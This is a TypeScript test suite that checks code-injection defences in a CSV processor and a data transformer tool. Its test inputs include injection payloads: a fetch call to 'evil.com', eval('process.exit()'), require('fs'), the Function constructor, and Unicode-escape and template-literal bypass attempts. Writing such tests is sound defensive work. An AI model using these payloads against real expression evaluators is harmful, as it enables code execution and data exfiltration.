/**
 * SECURITY FIXES TEST SUITE
 *
 * Tests to validate that the security fixes for CSV and Data Transformer tools
 * properly prevent code injection attacks.
 */

import { describe, it, expect } from 'vitest';
import { CSVProcessorTool } from '../csv-processor-tool.js';
import { DataTransformerTool } from '../data-transformer-tool.js';

describe('Security Fixes: CSV Processor Tool', () => {
  describe('Expression Evaluation Security', () => {
    it('should allow safe mathematical expressions', async () => {
      const tool = new CSVProcessorTool({
        operation: 'transform' as any,
        csvData: 'price,quantity\n10,5\n20,3',
        transformRules: [
          {
            column: 'total',
            operation: 'calculate',
            expression: '{price} * {quantity}',
          },
        ],
      });

      const result = await tool.performAction();

      expect(result.success).toBe(true);
      expect(result.data).toBeDefined();
      expect(result.data![0]).toHaveProperty('total', 50);
    });

    it('should block code injection attempts', async () => {
      const tool = new CSVProcessorTool({
        operation: 'transform' as any,
        csvData: 'price\n10',
        transformRules: [
          {
            column: 'total',
            operation: 'calculate',
            expression: 'price * 1.1; fetch("https://evil.com")',
          },
        ],
      });

      const result = await tool.performAction();

      // Should fail or return original value, not execute the fetch
      expect(result.success).toBe(true);
      expect(result.data![0].total).not.toBe('evil');
    });

    it('should block eval attempts', async () => {
      const tool = new CSVProcessorTool({
        operation: 'transform' as any,
        csvData: 'price\n10',
        transformRules: [
          {
            column: 'total',
            operation: 'calculate',
            expression: 'eval("process.exit()")',
          },
        ],
      });

      const result = await tool.performAction();

      // Should throw error or return original value
      expect(result.success).toBe(true);
    });

    it('should enforce maximum expression length', async () => {
      const longExpression = '1'.repeat(1001);

      const tool = new CSVProcessorTool({
        operation: 'transform' as any,
        csvData: 'price\n10',
        transformRules: [
          {
            column: 'total',
            operation: 'calculate',
            expression: longExpression,
          },
        ],
      });

      const result = await tool.performAction();

      // Should handle gracefully
      expect(result.success).toBe(true);
      expect(result.data![0].total).toBe(10); // Original value
    });

    it('should handle empty expressions', async () => {
      const tool = new CSVProcessorTool({
        operation: 'transform' as any,
        csvData: 'price\n10',
        transformRules: [
          {
            column: 'total',
            operation: 'calculate',
            expression: '',
          },
        ],
      });

      const result = await tool.performAction();

      expect(result.success).toBe(true);
      expect(result.data![0].total).toBe(10); // Original value
    });

    it('should validate expression characters', async () => {
      const tool = new CSVProcessorTool({
        operation: 'transform' as any,
        csvData: 'price\n10',
        transformRules: [
          {
            column: 'total',
            operation: 'calculate',
            expression: 'price; console.log("hacked")',
          },
        ],
      });

      const result = await tool.performAction();

      // Should handle gracefully
      expect(result.success).toBe(true);
    });
  });

  describe('Complex Mathematical Expressions', () => {
    it('should handle nested parentheses', async () => {
      const tool = new CSVProcessorTool({
        operation: 'transform' as any,
        csvData: 'a,b,c\n10,5,2',
        transformRules: [
          {
            column: 'result',
            operation: 'calculate',
            expression: '({a} + {b}) * {c}',
          },
        ],
      });

      const result = await tool.performAction();

      expect(result.success).toBe(true);
      expect(result.data![0].result).toBe(30);
    });

    it('should handle multiple operations', async () => {
      const tool = new CSVProcessorTool({
        operation: 'transform' as any,
        csvData: 'a,b,c\n10,5,2',
        transformRules: [
          {
            column: 'result',
            operation: 'calculate',
            expression: '{a} * {b} / {c} + {a}',
          },
        ],
      });

      const result = await tool.performAction();

      expect(result.success).toBe(true);
      expect(result.data![0].result).toBe(35);
    });

    it('should handle modulo operation', async () => {
      const tool = new CSVProcessorTool({
        operation: 'transform' as any,
        csvData: 'a,b\n10,3',
        transformRules: [
          {
            column: 'result',
            operation: 'calculate',
            expression: '{a} % {b}',
          },
        ],
      });

      const result = await tool.performAction();

      expect(result.success).toBe(true);
      expect(result.data![0].result).toBe(1);
    });
  });
});

describe('Security Fixes: Data Transformer Tool', () => {
  describe('Expression Evaluation Security', () => {
    it('should allow safe mathematical expressions', async () => {
      const tool = new DataTransformerTool({
        operation: 'map',
        inputData: [{ price: 10, quantity: 5 }],
        mapOperations: [
          {
            targetField: 'total',
            transform: 'calculate',
            expression: '{price} * {quantity}',
          },
        ],
      });

      const result = await tool.performAction();

      expect(result.success).toBe(true);
      expect(result.outputData[0].total).toBe(50);
    });

    it('should block code injection attempts', async () => {
      const tool = new DataTransformerTool({
        operation: 'map',
        inputData: [{ price: 10 }],
        mapOperations: [
          {
            targetField: 'total',
            transform: 'calculate',
            expression: 'price * 1.1; eval("process.exit()")',
          },
        ],
      });

      const result = await tool.performAction();

      // Should throw error or handle gracefully
      expect(result.success).toBe(false);
      expect(result.error).toContain('Invalid expression');
    });

    it('should enforce maximum expression length', async () => {
      const longExpression = '1'.repeat(1001);

      const tool = new DataTransformerTool({
        operation: 'map',
        inputData: [{ price: 10 }],
        mapOperations: [
          {
            targetField: 'total',
            transform: 'calculate',
            expression: longExpression,
          },
        ],
      });

      const result = await tool.performAction();

      expect(result.success).toBe(false);
      expect(result.error).toContain('too long');
    });

    it('should handle empty expressions', async () => {
      const tool = new DataTransformerTool({
        operation: 'map',
        inputData: [{ price: 10 }],
        mapOperations: [
          {
            targetField: 'total',
            transform: 'calculate',
            expression: '',
          },
        ],
      });

      const result = await tool.performAction();

      expect(result.success).toBe(false);
      expect(result.error).toContain('cannot be empty');
    });

    it('should validate result is finite number', async () => {
      const tool = new DataTransformerTool({
        operation: 'map',
        inputData: [{ price: NaN }],
        mapOperations: [
          {
            targetField: 'total',
            transform: 'calculate',
            expression: '{price} * 2',
          },
        ],
      });

      const result = await tool.performAction();

      expect(result.success).toBe(false);
    });
  });

  describe('Custom Transformation Security', () => {
    it('should block custom transformations by default', async () => {
      const tool = new DataTransformerTool({
        operation: 'custom',
        inputData: [{ price: 10 }],
        customScript: '(data) => data.map(x => x.price * 2)',
      });

      const result = await tool.performAction();

      expect(result.success).toBe(false);
      expect(result.error).toContain('disabled for security reasons');
    });

    it('should block dangerous patterns in custom scripts', async () => {
      // Set environment variable to enable custom transformations
      process.env.ALLOW_CUSTOM_TRANSFORMATIONS = 'true';

      const tool = new DataTransformerTool({
        operation: 'custom',
        inputData: [{ price: 10 }],
        customScript: '(data) => { eval("process.exit()"); return data; }',
      });

      const result = await tool.performAction();

      expect(result.success).toBe(false);
      expect(result.error).toContain('dangerous pattern');

      // Cleanup
      delete process.env.ALLOW_CUSTOM_TRANSFORMATIONS;
    });

    it('should block fetch in custom scripts', async () => {
      process.env.ALLOW_CUSTOM_TRANSFORMATIONS = 'true';

      const tool = new DataTransformerTool({
        operation: 'custom',
        inputData: [{ price: 10 }],
        customScript: '(data) => { fetch("https://evil.com"); return data; }',
      });

      const result = await tool.performAction();

      expect(result.success).toBe(false);
      expect(result.error).toContain('dangerous pattern');

      delete process.env.ALLOW_CUSTOM_TRANSFORMATIONS;
    });

    it('should block require in custom scripts', async () => {
      process.env.ALLOW_CUSTOM_TRANSFORMATIONS = 'true';

      const tool = new DataTransformerTool({
        operation: 'custom',
        inputData: [{ price: 10 }],
        customScript: '(data) => { const fs = require("fs"); return data; }',
      });

      const result = await tool.performAction();

      expect(result.success).toBe(false);
      expect(result.error).toContain('dangerous pattern');

      delete process.env.ALLOW_CUSTOM_TRANSFORMATIONS;
    });

    it('should block Function constructor in custom scripts', async () => {
      process.env.ALLOW_CUSTOM_TRANSFORMATIONS = 'true';

      const tool = new DataTransformerTool({
        operation: 'custom',
        inputData: [{ price: 10 }],
        customScript: '(data) => { const f = new Function("return 1"); return data; }',
      });

      const result = await tool.performAction();

      expect(result.success).toBe(false);
      expect(result.error).toContain('dangerous pattern');

      delete process.env.ALLOW_CUSTOM_TRANSFORMATIONS;
    });

    it('should enforce maximum script length', async () => {
      process.env.ALLOW_CUSTOM_TRANSFORMATIONS = 'true';

      const longScript = '1'.repeat(10001);

      const tool = new DataTransformerTool({
        operation: 'custom',
        inputData: [{ price: 10 }],
        customScript: longScript,
      });

      const result = await tool.performAction();

      expect(result.success).toBe(false);
      expect(result.error).toContain('too long');

      delete process.env.ALLOW_CUSTOM_TRANSFORMATIONS;
    });

    it('should allow safe custom scripts when enabled', async () => {
      process.env.ALLOW_CUSTOM_TRANSFORMATIONS = 'true';

      const tool = new DataTransformerTool({
        operation: 'custom',
        inputData: [
          { price: 10, quantity: 2 },
          { price: 20, quantity: 3 },
        ],
        customScript: '(data) => data.map(row => ({ ...row, total: row.price * row.quantity }))',
      });

      const result = await tool.performAction();

      expect(result.success).toBe(true);
      expect(result.outputData[0].total).toBe(20);
      expect(result.outputData[1].total).toBe(60);

      delete process.env.ALLOW_CUSTOM_TRANSFORMATIONS;
    });

    it('should validate custom script returns array', async () => {
      process.env.ALLOW_CUSTOM_TRANSFORMATIONS = 'true';

      const tool = new DataTransformerTool({
        operation: 'custom',
        inputData: [{ price: 10 }],
        customScript: '(data) => ({ not: "an array" })',
      });

      const result = await tool.performAction();

      expect(result.success).toBe(false);
      expect(result.error).toContain('must return an array');

      delete process.env.ALLOW_CUSTOM_TRANSFORMATIONS;
    });

    it('should validate custom script returns objects', async () => {
      process.env.ALLOW_CUSTOM_TRANSFORMATIONS = 'true';

      const tool = new DataTransformerTool({
        operation: 'custom',
        inputData: [{ price: 10 }],
        customScript: '(data) => [1, 2, 3]',
      });

      const result = await tool.performAction();

      expect(result.success).toBe(false);
      expect(result.error).toContain('array of objects');

      delete process.env.ALLOW_CUSTOM_TRANSFORMATIONS;
    });
  });

  describe('Field Reference Security', () => {
    it('should handle non-existent fields gracefully', async () => {
      const tool = new DataTransformerTool({
        operation: 'map',
        inputData: [{ price: 10 }],
        mapOperations: [
          {
            targetField: 'total',
            transform: 'calculate',
            expression: '{nonExistentField} * 2',
          },
        ],
      });

      const result = await tool.performAction();

      expect(result.success).toBe(true);
      expect(result.outputData[0].total).toBe(0); // Default value
    });

    it('should handle non-numeric field values', async () => {
      const tool = new DataTransformerTool({
        operation: 'map',
        inputData: [{ price: 'not a number' }],
        mapOperations: [
          {
            targetField: 'total',
            transform: 'calculate',
            expression: '{price} * 2',
          },
        ],
      });

      const result = await tool.performAction();

      expect(result.success).toBe(true);
      expect(result.outputData[0].total).toBe(0); // Default value
    });

    it('should handle null field values', async () => {
      const tool = new DataTransformerTool({
        operation: 'map',
        inputData: [{ price: null }],
        mapOperations: [
          {
            targetField: 'total',
            transform: 'calculate',
            expression: '{price} * 2',
          },
        ],
      });

      const result = await tool.performAction();

      expect(result.success).toBe(true);
      expect(result.outputData[0].total).toBe(0); // Default value
    });
  });
});

describe('Security: Edge Cases and Attack Vectors', () => {
  it('should prevent Unicode escape bypass attempts', async () => {
    const tool = new CSVProcessorTool({
      operation: 'transform' as any,
      csvData: 'price\n10',
      transformRules: [
        {
          column: 'total',
          operation: 'calculate',
          expression: '{price}\\u002b(eval("process.exit()"))',
        },
      ],
    });

    const result = await tool.performAction();

    // Should not execute the eval
    expect(result.success).toBe(true);
  });

  it('should prevent template literal injection', async () => {
    const tool = new CSVProcessorTool({
      operation: 'transform' as any,
      csvData: 'price\n10',
      transformRules: [
        {
          column: 'total',
          operation: 'calculate',
          expression: '${process.exit()}',
        },
      ],
    });

    const result = await tool.performAction();

    expect(result.success).toBe(true);
  });

  it('should handle very long valid expressions', async () => {
    const validLongExpression = '1+1+'.repeat(250); // 1000 chars

    const tool = new CSVProcessorTool({
      operation: 'transform' as any,
      csvData: 'price\n10',
      transformRules: [
        {
          column: 'total',
          operation: 'calculate',
          expression: validLongExpression,
        },
      ],
    });

    const result = await tool.performAction();

    expect(result.success).toBe(true);
  });

  it('should prevent division by zero gracefully', async () => {
    const tool = new CSVProcessorTool({
      operation: 'transform' as any,
      csvData: 'price\n10',
      transformRules: [
        {
          column: 'total',
          operation: 'calculate',
          expression: '{price} / 0',
        },
      ],
    });

    const result = await tool.performAction();

    expect(result.success).toBe(true);
    expect(result.data![0].total).toBe(Infinity);
  });
});
